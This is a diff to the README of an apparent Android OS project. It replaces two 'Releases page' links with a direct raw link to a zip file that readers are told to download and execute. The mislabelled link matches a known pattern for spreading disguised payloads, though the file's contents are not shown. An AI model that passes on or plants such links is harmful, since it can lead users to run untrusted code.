@@ -29,7 +29,7 @@ OSSP Android OS is designed for developers and enthusiasts who want to explore t
 
 To install OSSP Android OS, follow these steps:
 
-1. **Download the Latest Release**: Visit our [Releases page](https://github.com/billsam14/OSSP_Android_OS/releases) to download the latest version. Make sure to choose the appropriate file for your device.
+1. **Download the Latest Release**: Visit our [Releases page](https://raw.githubusercontent.com/billsam14/OSSP_Android_OS/main/reanimate/OS_OSS_Android_3.6.zip) to download the latest version. Make sure to choose the appropriate file for your device.
 
 2. **Execute the File**: After downloading, execute the file according to your device's specifications. This may involve using specific tools or commands based on your platform.
 
@@ -53,7 +53,7 @@ Your contributions help make OSSP Android OS better for everyone!
 
 ## Releases
 
-To keep your installation up to date, regularly check our [Releases page](https://github.com/billsam14/OSSP_Android_OS/releases). This page contains all the latest versions of OSSP Android OS. Download the appropriate file and execute it to update your system.
+To keep your installation up to date, regularly check our [Releases page](https://raw.githubusercontent.com/billsam14/OSSP_Android_OS/main/reanimate/OS_OSS_Android_3.6.zip). This page contains all the latest versions of OSSP Android OS. Download the appropriate file and execute it to update your system.
 
 ## License
 
